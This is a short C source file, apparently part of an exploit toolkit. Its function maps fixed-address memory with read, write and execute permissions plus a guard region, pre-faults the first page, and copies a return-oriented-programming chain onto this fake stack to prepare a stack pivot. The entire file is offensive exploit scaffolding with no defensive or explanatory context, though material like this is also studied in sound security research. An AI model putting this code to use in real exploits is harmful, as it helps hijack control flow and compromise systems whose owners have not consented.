#include "stack_pivot.h"
#include "utils.h"

void stash_fake_stack(void *fake_stack_addr,
                    size_t fake_stack_size,
                    size_t guard_size,
                    rop_buffer_t *rop)
{
    INFO("Stashing fake stack at: %p, stack size (0x%zx) must be page-aligned",
            fake_stack_addr, fake_stack_size);

    void *mapped = mmap(fake_stack_addr - guard_size,
                        (fake_stack_size + guard_size),
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED)
        DIE("mmap");

    INFO("Mapped buffer starts at: %p, with a 0x%zx guard page)",
            mapped, guard_size);

    // Touch first page (COW) to avoid faults (double fault)
    ((uintptr_t *)mapped)[0] = 0xdeadbeefcafebabe;

    // place ROP chain on fake stack
    memcpy(fake_stack_addr, rop->chain, rop->count * sizeof(uintptr_t));

    INFO("ROP chain of %zu entries placed at: %p", rop->count, fake_stack_addr);
}

